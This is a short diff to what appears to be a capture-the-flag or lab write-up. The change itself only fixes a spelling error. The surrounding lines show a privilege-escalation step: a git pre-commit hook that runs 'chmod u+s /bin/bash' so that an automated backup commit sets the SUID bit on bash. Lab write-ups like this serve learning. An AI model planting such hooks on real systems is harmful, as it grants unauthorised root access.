@@ -372,7 +372,7 @@ CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build .
 >![[Pasted image 20250227153859.png]]
 >![[Pasted image 20250227153325.png]]
 
-- It looks like is doing sync the git repo and making some backups, we can use hooks to write a [pre commit action](https://gtfobins.github.io/gtfobins/git/#shell) when a commit happend
+- It looks like is doing sync the git repo and making some backups, we can use hooks to write a [pre commit action](https://gtfobins.github.io/gtfobins/git/#shell) when a commit happened
 ```bash
 echo 'chmod u+s /bin/bash' > /home/dev01/.git/hooks/pre-commit
 chmod +x ~/.git/hooks/pre-commit
